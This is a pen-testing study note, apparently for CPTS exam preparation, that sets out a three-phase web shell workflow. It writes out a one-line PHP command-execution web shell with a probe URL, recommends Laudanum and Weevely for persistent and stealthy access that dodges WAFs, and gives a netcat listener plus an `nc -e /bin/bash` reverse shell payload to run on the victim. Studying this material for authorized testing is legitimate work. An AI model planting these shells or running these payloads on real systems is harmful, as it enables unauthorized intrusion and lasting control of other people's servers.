---
title: "Web Shell Workflow"
category: ["PREP_CPTS", "Pen-testing", "shells", "WebShells", "Web-Shell Workflow"]
---

## Web Exploitation Workflow: From One-Liner to Reverse Shell

### Phase 1: The Probe (Verification & Stealth)

Before deploying heavy tools, always verify the vulnerability with a minimal **One-Liner**. This approach is faster, harder to detect by WAFs (Web Application Firewalls), and confirms execution without complex dependencies.

- **Objective:** Confirm Remote Code Execution (RCE).
    
    ```
    <?php system($_GET['0']); ?>
    ```
    
- **Execution:** `[http://target.com/uploads/probe.php?0=whoami](http://target.com/uploads/probe.php?0=whoami)`
    
- **Why:** If `whoami` returns a username (like `www-data` or `apache`), the exploit is confirmed.
    

### Phase 2: The Bridge (Robust Webshells)

Once RCE is confirmed, you may need a more stable environment to explore the file system or bypass restrictions. Tools like **Laudanum** or **Weevely** provide a "bridge."

- **Objective:** Gain persistence, manage files, and secure the access point.
    
- **Tools:** Laudanum (multi-language), Weevely (stealthy/encrypted).
    
- **Benefits:**
    
    - **IP Filtering:** Restricts access so only the attacker can use the shell.
        
    - **Functionality:** Built-in file upload/download and directory navigation.
        
    - **Stability:** Better handling of complex commands than a URL parameter.
        

### Phase 3: The Takeover (The Reverse Shell)

The ultimate goal of any web exploit is to move from the browser to a local terminal. This allows for full interactivity, job control, and easier privilege escalation.

- **Objective:** Receive a connection back to your attacking machine.
    
- **The Listener (Attacker):**
    
    ```
    nc -lvnp 4444
    ```
    
- **The Payload (Victim):** Use your webshell to execute the callback:
    
    ```
    nc -e /bin/bash <your_ip> 4444
    ```